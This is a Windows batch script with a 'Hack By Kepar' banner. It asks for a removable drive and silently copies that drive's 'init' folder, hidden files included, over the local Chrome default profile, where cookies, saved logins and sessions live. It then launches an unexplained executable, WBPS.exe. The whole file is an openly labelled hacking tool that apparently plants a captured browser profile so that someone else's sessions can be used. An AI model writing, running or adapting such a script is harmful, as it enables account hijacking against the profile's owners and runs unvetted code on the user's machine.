@echo off
color b
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                      Choose a device
echo.
echo                          D:\ (1)
echo.
echo                          E:\ (2)
echo.
echo                          F:\ (3)
echo.
echo                          G:\ (4)
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
set /p web=:
if "%web%"=="1" goto d
if "%web%"=="2" goto e
if "%web%"=="3" goto f
if "%web%"=="4" goto g

:d
Xcopy "D:\init\" "%localappdata%\Google\Chrome\User Data\Default" /E /H /C /I /Q >nul
goto done
:e
Xcopy "E:\init\" "%localappdata%\Google\Chrome\User Data\Default" /E /H /C /I /Q >nul
goto done
:f
Xcopy "F:\init\" "%localappdata%\Google\Chrome\User Data\Default" /E /H /C /I /Q >nul
goto done
:g
Xcopy "G:\init\" "%localappdata%\Google\Chrome\User Data\Default" /E /H /C /I /Q >nul
goto done

:done
echo done!
pause
WBPS.exe